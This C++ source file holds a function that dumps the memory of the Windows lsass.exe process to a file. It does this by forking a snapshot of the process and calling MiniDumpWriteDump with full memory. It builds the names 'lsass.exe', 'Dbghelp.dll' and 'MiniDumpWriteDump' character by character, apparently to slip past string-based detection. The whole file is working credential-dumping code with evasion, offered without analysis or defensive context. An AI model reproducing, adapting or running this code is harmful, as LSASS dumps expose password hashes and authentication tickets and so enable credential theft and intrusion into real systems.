#include "fork.h"
#include "dump.h"

BOOL dumpLsa(wchar_t* szFileName)
{
    DWORD targetProcessId=NULL;
    ForkSnapshot* snapshot = NULL;
    HANDLE snapshotProcess = NULL;
    char szntdll[] = { 'n','t','d','l','l','.','d','l','l','\0' };
    wchar_t szlsass[] = { L'l',L's',L'a',L's',L's',L'.',L'e',L'x',L'e',L'\0' };
    targetProcessId = MGetProcessId(szlsass);
    snapshot = new ForkSnapshot(targetProcessId);
    if (!snapshot->Init())
    {
        delete snapshot;
        return FALSE;
    }
;
    snapshotProcess = snapshot->TakeSnapshot();
    if (snapshotProcess == NULL)
    {
        snapshot->CleanSnapshot();
        delete snapshot;
        return FALSE;
    }
    DWORD dwForkPID = GetProcessId(snapshotProcess);
    // Dump LSA
    char szDbghelp[] = { 'D','b','g','h','e','l','p','.','d','l','l','\0' };
    char szMiniDumpWriteDump[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p','\0' };
    _MiniDumpWriteDump MMiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(
        LoadLibraryA(szDbghelp), szMiniDumpWriteDump);
    HANDLE outFile = CreateFileW(szFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    BOOL isD = MMiniDumpWriteDump(snapshotProcess, dwForkPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!isD)
    {
        if (snapshot != NULL)
        {
            snapshot->CleanSnapshot();
            delete snapshot;
        }
        CloseHandle(outFile);
        return FALSE;
    }
    if (snapshot != NULL)
    {
        snapshot->CleanSnapshot();
        delete snapshot;
    }
    CloseHandle(outFile);
    return TRUE;

}